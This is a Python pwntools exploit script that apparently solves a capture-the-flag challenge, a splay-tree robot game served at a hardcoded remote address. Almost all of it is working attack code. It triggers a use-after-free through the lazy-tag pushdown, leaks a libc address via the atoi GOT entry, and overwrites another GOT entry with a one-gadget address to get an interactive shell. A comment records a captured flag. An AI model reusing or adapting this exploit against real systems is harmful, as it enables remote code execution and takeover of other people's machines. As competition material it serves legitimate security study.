#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "202.120.7.212"
port = 12321
#host = "10.211.55.8"
#port = 8888
#flag{5Pl4y_h45_m4Ny_cR4zy_l4zy_7465}

# It's a common problem in lazy tag of splay tree.

r = remote(host,port)

def login(size,name):
    r.recvuntil("Choose:")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(size))
    r.recvuntil("?")
    r.sendline(name)

def changename(size,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("?")
    r.sendline(str(size))
    r.recvuntil("?")
    r.sendline(name)

def killrobot(x,y):
    r.recvuntil("Choose:")
    r.sendline("6")
    #r.recvuntil(":")
    r.sendline("1")
    #r.recvuntil(":")
    r.sendline(str(x))
    #r.recvuntil(":")
    r.sendline(str(y))
    #r.recvuntil("(y/n)")
    r.sendline("y")

def addrobot(count,hp,version):
    r.recvuntil("Choose:")
    r.sendline("5")
    r.recvuntil("?")
    r.sendline(str(count))
    r.recvuntil("?")
    r.sendline(str(hp))
    r.recvuntil("?")
    r.sendline(version)

def shotbot(x,y):
    r.recvuntil("Choose:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(x))
    r.recvuntil(":")
    r.sendline(str(y))

def rebot(x,y):
    r.recvuntil("Choose:")
    r.sendline("4")
    #r.recvuntil(":")
    r.sendline(str(x))
    #r.recvuntil(":")
    r.sendline(str(y))

def showbot(x):
    r.recvuntil("Choose:")
    r.sendline("6")
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(x))
    

login(0x8,"a"*0x4)

addrobot(1,10,"da")
killrobot(10,10)
shotbot(0,9)
addrobot(1,1,"orane") #create a dangling robot
addrobot(1,10,"orane") # trigger pushdown to kill the robot
for i in range(10):
    killrobot(9-i,9-i)
for i in range(17):    
    rebot(0,0)
for i in range(10):
    r.recvuntil("Choose:")

killrobot(0,0) # delete the leaf
atoi_got = 0x804cffc
changename(0x20,p32(atoi_got) + "a"*8 + p32(0)) # trigger use after free
showbot(0)
r.recvuntil("version ")
data = r.recvuntil("HP")[:4] 
#libc = u32(data) - 0x318e0
libc = u32(data) - 0x2f850
print "libc:",hex(libc)
#tls_get_addr_got = libc + 0x1ab030
tls_get_addr_got = libc + 0x1a9030
magic = libc+ 0x3e297
changename(0x20,"a"*4 + p32(tls_get_addr_got) + p32(0x804d058))
r.recvuntil(":")
r.sendline("0")
r.recvuntil("nickname")
r.sendline(p32(magic))
r.interactive()
